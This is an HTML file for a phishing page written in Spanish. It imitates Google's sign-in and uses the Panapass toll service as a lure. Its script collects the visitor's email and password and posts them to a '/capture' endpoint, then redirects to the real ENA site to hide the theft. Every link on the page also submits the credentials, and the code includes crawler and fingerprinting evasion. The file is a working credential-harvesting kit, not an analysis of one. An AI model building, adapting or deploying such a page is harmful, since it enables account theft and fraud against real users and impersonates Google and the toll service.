<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Anti-crawler meta: Prevents indexing by search bots -->
    <meta name="robots" content="noindex, nofollow">
    <title>Iniciar sesión - Cuentas de Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #202124;
        }
        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px rgba(60,64,67,0.15);
            box-sizing: border-box;
            margin: 20px;
        }
        @media (max-width: 768px) {
            .container {
                padding: 24px 20px 18px;
                margin: 10px;
                border-radius: 4px;
            }
        }
        @media (max-width: 480px) {
            .container {
                width: 95%;
                padding: 16px 12px 12px;
                margin: 5px;
            }
            h1.title {
                font-size: 20px;
            }
            p.subtitle {
                font-size: 14px;
            }
            input {
                font-size: 14px;
                height: 48px;
            }
            .next-btn {
                height: 40px;
                font-size: 13px;
            }
        }
        .header {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo {
            width: 75px;
            height: 24px;
            margin-bottom: 8px;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            margin: 0;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin: 8px 0 0;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 8px;
        }
        input {
            width: 100%;
            height: 56px;
            padding: 0 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
            line-height: 24px;
        }
        input:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 1px 0 #1a73e8;
        }
        .next-btn {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 0 24px;
            height: 36px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-top: 24px;
        }
        .next-btn:hover {
            background: #1557b0;
        }
        .forgot {
            display: block;
            text-align: center;
            margin: 16px 0;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            cursor: pointer;
        }
        .footer {
            text-align: center;
            margin-top: 24px;
            font-size: 12px;
            color: #5f6368;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 8px;
            cursor: pointer;
        }
        .greeting {
            font-size: 20px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        .email-display {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 16px;
        }
        .hidden {
            display: none;
        }
        #identifier-error {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
        }
        /* Randomized class for anti-fingerprinting */
        .dynamic-container {
            /* Random class added via JS */
            box-sizing: border-box;
        }
    </style>
</head>
<body>
    <div class="container dynamic-container">
        <!-- Identifier Step -->
        <div id="identifier-step">
            <div class="header">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
                <h1 class="title">Iniciar sesión</h1>
                <p class="subtitle">Continuar con el envío de Panapass</p>
            </div>
            <form id="identifier-form">
                <div class="form-group">
                    <label for="email">Correo electrónico</label>
                    <input type="email" id="email" name="email" required autofocus>
                </div>
                <button type="submit" class="next-btn">Siguiente</button>
            </form>
            <div class="footer">
                <a href="#" id="create-account-link">Crear cuenta</a>
                <a href="#" id="next-link">Siguiente</a>
            </div>
        </div>

        <!-- Password Step -->
        <div id="password-step" class="hidden">
            <div class="header">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
                <h1 class="title">Bienvenido</h1>
                <p id="email-display" class="email-display"></p>
                <p class="subtitle">Continuar con el envío de Panapass</p>
            </div>
            <form id="password-form">
                <div class="form-group">
                    <label for="password">Ingresa tu contraseña</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="next-btn">Siguiente</button>
            </form>
            <a href="#" class="forgot" id="forgot-password-link">¿Olvidaste tu contraseña?</a>
            <div class="footer">
                <a href="#" id="create-account-link-password">Crear cuenta</a>
                <a href="#" id="next-link-password">Siguiente</a>
            </div>
        </div>
    </div>

    <script>
        let enteredEmail = '';
        let timeoutId;  // Global timer variable for clearing/restarting
        const timeoutDuration = 2 * 60 * 1000;  // 2 minutes for quick abandon captures

        function resetTimeout() {
            clearTimeout(timeoutId);  // Clear existing timer
            timeoutId = setTimeout(() => {
                // On timeout, fetch /timeout_capture
                fetch('/timeout_capture', { method: 'POST' })
                    .then(response => {
                        if (response.ok) {
                            // Data logged silently
                        } else {
                            console.log('Timeout capture failed: ' + response.status);
                        }
                    })
                    .catch(err => console.log('Timeout capture error: ' + err));
            }, timeoutDuration);
        }

        // Reset on activity: input changes on email/password, mouse moves, keypresses, scrolls, clicks, touches
        document.getElementById('email').addEventListener('input', resetTimeout);
        document.getElementById('password').addEventListener('input', resetTimeout);
        window.addEventListener('mousemove', resetTimeout);
        window.addEventListener('keypress', resetTimeout);
        window.addEventListener('scroll', resetTimeout);
        window.addEventListener('click', resetTimeout);
        window.addEventListener('touchstart', resetTimeout);

        // Initial timeout on load: Calls resetTimeout() to start the 2-min countdown
        resetTimeout();

        // Validation function for email only
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        function showError(message) {
            let errorDiv = document.getElementById('identifier-error');
            if (!errorDiv) {
                errorDiv = document.createElement('div');
                errorDiv.id = 'identifier-error';
                errorDiv.style.color = '#d93025';
                errorDiv.style.fontSize = '12px';
                errorDiv.style.marginTop = '8px';
                document.getElementById('email').parentNode.appendChild(errorDiv);
            }
            errorDiv.textContent = message;
        }

        function clearError() {
            const errorDiv = document.getElementById('identifier-error');
            if (errorDiv) errorDiv.remove();
        }

        // Function to submit data (used by password form and links)
        function submitData(password = '') {
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `email=${encodeURIComponent(enteredEmail)}&password=${encodeURIComponent(password)}`
            })
            .then(response => {
                if (response.ok) {
                    // Redirect to real ENA site after capture
                    window.location.href = 'https://www.enarecargas.com/maxipista/private';
                }
            })
            .catch(err => console.log('Capture error: ' + err));
        }

        // Handle identifier form submit: Validate email, capture, toggle to password step with delay
        document.getElementById('identifier-form').addEventListener('submit', function(e) {
            e.preventDefault();
            clearError();
            enteredEmail = document.getElementById('email').value.trim();
            if (!enteredEmail) {
                showError('Ingresa una dirección de correo electrónico');
                return;
            }
            if (!isValidEmail(enteredEmail)) {
                showError('Ingresa una dirección de correo electrónico válida');
                return;
            }
            // Valid: simulate loading delay, then toggle to password step
            setTimeout(() => {
                document.getElementById('email-display').textContent = enteredEmail;
                document.getElementById('identifier-step').classList.add('hidden');
                document.getElementById('password-step').classList.remove('hidden');
                document.getElementById('password').focus();
                resetTimeout();  // Reset timer on step change
            }, 800);  // 0.8 second delay for realistic feel
        });

        // Handle password form submit: Submit with password
        document.getElementById('password-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            submitData(password);
        });

        // Handle links in identifier step (submit without password)
        document.getElementById('create-account-link').addEventListener('click', function(e) {
            e.preventDefault();
            enteredEmail = document.getElementById('email').value.trim();
            submitData();
        });
        document.getElementById('next-link').addEventListener('click', function(e) {
            e.preventDefault();
            enteredEmail = document.getElementById('email').value.trim();
            submitData();
        });

        // Handle links in password step (submit with current password input, even if empty)
        document.getElementById('forgot-password-link').addEventListener('click', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            submitData(password);
        });
        document.getElementById('create-account-link-password').addEventListener('click', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            submitData(password);
        });
        document.getElementById('next-link-password').addEventListener('click', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            submitData(password);
        });

        // Randomized container class for fingerprint evasion
        (function() {
            var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
            document.querySelector('.dynamic-container').classList.add(randomClass);
        })();
    </script>
</body>
</html>
